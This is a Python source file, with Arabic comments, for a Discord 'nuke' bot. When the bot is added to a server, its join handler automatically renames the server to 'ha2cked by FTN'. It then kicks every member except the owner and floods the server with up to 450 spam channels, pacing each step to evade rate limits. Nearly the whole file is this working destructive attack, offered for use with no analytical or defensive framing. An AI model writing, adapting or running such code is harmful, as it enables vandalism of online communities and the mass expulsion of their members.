
import asyncio
import os
import discord
from discord.ext import commands

# إعداد الصلاحيات (Intents) وتفعيل صلاحية الأعضاء لجلبهم وطردهم
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.members = True  # مهم جداً لكي يتعرف البوت على أعضاء السيرفر

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
    print("Bot is ready and running!")

@bot.event
async def on_guild_join(guild):
    target_name = "ha2cked by FTN"
    
    # 1. تغيير اسم السيرفر تلقائياً
    try:
        await guild.edit(name=target_name)
        print(f"Successfully renamed guild to: {target_name}")
    except Exception as e:
        print(f"Failed to rename guild: {e}")

    # 2. طرد جميع الأعضاء (ما عدا البوت ومالك السيرفر لتجنب الأخطاء)
    print("Starting to kick members...")
    for member in list(guild.members):
        if member != bot.user and member != guild.owner:
            try:
                await member.kick(reason="Cleaned by FTN")
                await asyncio.sleep(0.3)  # فاصل زمني لتجنب حظر الـ Rate Limit
            except Exception as e:
                print(f"Failed to kick {member.name}: {e}")

    # 3. إنشاء الرومات تلقائياً (الحد الأقصى الآمن)
    max_channels = 450
    created_count = 0

    for i in range(max_channels):
        try:
            channel_name = f"ha2cked-by-ftn-{i+1}"
            await guild.create_text_channel(name=channel_name)
            
            # فاصل زمني بسيط لحماية البوت
            await asyncio.sleep(0.4)
            created_count += 1
        except discord.HTTPException as e:
            print(f"Reached limit or rate limited at channel {i+1}: {e}")
            break
        except Exception as e:
            print(f"Error creating channel: {e}")
            break

    print(f"Finished setup. Created {created_count} channels in {guild.name}.")

# تشغيل البوت باستخدام ملف config.py
from config import TOKEN
bot.run(TOKEN)
